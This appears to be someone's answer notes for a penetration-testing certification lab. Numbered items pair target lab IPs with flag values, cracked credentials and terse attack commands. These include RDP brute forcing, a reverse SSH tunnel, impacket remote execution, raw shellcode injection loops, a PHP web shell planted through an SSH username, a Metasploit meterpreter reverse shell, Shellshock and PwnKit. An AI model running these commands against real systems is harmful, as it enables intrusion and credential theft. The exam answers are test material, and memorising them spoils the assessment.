# Scope1
```bash
1* 172.25.170.30 #1C

sudo nmap -T5 -Pn -A 172.25.170.30 # 3389、445
hydra rdp://172.25.170.30 -L UserNames.txt -P Password.txt # cpent/Pa$$w0rd
xfreerdp
nbtstat -n
```
```bash
2* 172.25.170.30 # Domain Controller

Active Directory Users and Computers
```
```bash
3* 172.25.170.200 # 1B

sudo nmap -T5 -Pn -A 172.25.170.200 # 3389、445
hydra rdp://172.25.170.200 -L UserNames.txt -P Password.txt # aspen/cpent@123
```
```bash
4* smb2 signing 172.25.170.30 # Enable
sudo nmap -T5 -Pn -A 172.25.170.30 -p445 -sV
```
```bash
5* 172.25.170.30 # domain:COMMANDERTWO
sudo nmap -T5 -Pn -A 172.25.170.30
```
```bash
6* 172.25.170.30 # computer:COMMANDER
sudo nmap -T5 -Pn -A 172.25.170.30
```
```bash
7* 172.25.170.200 # ECC.LOCALNET
sudo nmap -T5 -Pn -A 172.25.170.200
```
```bash
8* smb2 signing 172.25.170.200 # Enable
sudo nmap -T5 -Pn -A 172.25.170.200 -p445 -sV
```
```bash
9* 172.25.170.90 # LA
sudo nmap -T5 -Pn -A 172.25.170.90
```
```bash
10* adminflag.txt 172.25.170.20 # 09C5

plink.exe -ssh kali@172.27.234.2 -R 445:172.25.170.20.445
crackmapexec smb 127.0.0.1 -u Username.txt -p 'Pa$$w0rd123' # cpent/Pa$$w0rd123
impacket-atexec CPENTCPENT.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certuil -hashfile C:\\Users\\Administrator\\adminflag.txt SHA256"
```
```bash
11* adminflagBRAVO.txt 172.25.170.70 # SERVER2008-ADDC

# administrator/Pa$$w0rd123
```
# Scope2
```bash
12* R8 register 172.25.120.210 # 0x0

gdb > registers info
```
```bash
13* 172.25.120.220 RootFlagTwo.txt # 9f9f7a

while true; do (python2 ./exp_leveltwo.py; cat) | ./level-two; done
md5sum /opt/RootFlagTwo.txt
```
```bash
14* 172.25.120.210 RootFlagTwo.txt # 323C80

while true; do (python2 exp_challenge-one.py; python -c 'import sys;sys.stdout.write("\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")';cat) | ./challenge-one; done
md5sum /opt/RootFlag210.txt
```
```bash
15*  R8 register 172.25.120.220 # 0x2b

gdb > registers info
```
```bash
16*  172.25.120.220  system() - (include the 0x) # 0x149f32

gdb > registers info
gdb > find /bash/sh
gdb > p system
```
```bash
17*  (use the first address in the executable, not the stack) - (include the 0x) # 0x8048610

gdb > find /bash/sh
```
```bash
18* 172.25.120.100 FileOne.bin # LZMA

binwalk -t FileOne.bin
```
```bash
19* 172.25.120.100 FileOne.bin # 2010

binwalk -t FileOne.bin
```
```bash
20* 172.25.120.100 FileOne.bin #1119

binwalk -t FileOne.bin
```
```bash
21* 172.25.120.100 File2.bin #0x43
22* 172.25.120.100 File2.bin #piggy
23* 172.25.120.100 File2.bin #0x1C

binwalk -t File2.bin
```
```bash
24* IOT.bin password 

binwalk -e IOT.bin #1234
```
```bash
25* IOT.bin useranonymous  # anon@localhost

/romfile.cfg
```
# Scope3
```bash
26* 172.25.20.6 secret.txt # pskmt87h9y2

dirb http://172.25.20.6
# Site Editor 1.1.1
ssh '<?php system($_GET['cmd']); ?>'@172.25.20.6
cmd = cat /etc/flag/secret.txt
```
```bash
27* 172.25.20.4 secret.txt # lux76hk5pp

# administrator / 1234567
msfconsole -q
msf > use exploit/windows/smb/psexec
msf > set rhost 172.25.30.4
msf > set smbuser administrator
msf > set smbpass 1234567
msf > set payload windows/meterpreter/reverse_tcp
msf > exploit
shell
search -f secret.txt
```
```bash
28* 172.25.30.5 Secret.txt # jk89mod1j90

dirb http://172.25.30.5/cgi-bin
shellshock
```
```bash
29* 172.25.20.7 # ut90u70sap

hydra
PwnKit
``` 
```bash
30* 172.25.20.7 # b5ph89fg9i0

hydra
PwnKit
``` 
# Scope4
